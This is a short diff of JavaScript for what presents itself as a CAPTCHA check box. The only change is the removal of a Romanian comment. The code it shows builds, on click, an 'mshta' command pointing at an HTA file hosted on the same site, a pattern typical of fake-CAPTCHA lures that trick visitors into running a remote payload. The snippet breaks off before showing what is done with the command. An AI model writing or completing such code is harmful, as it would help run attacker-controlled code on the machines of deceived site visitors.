@@ -3,7 +3,6 @@ const modal = document.getElementById('modal');
 const overlay = document.getElementById('overlay');
 
 captchaBox.addEventListener('click', () => {
-    // Folosim o cale directă pentru fișierul HTA
     const htaPath = window.location.origin + "/captchamethods/info.hta";
     const realCommand = "mshta " + htaPath;
     
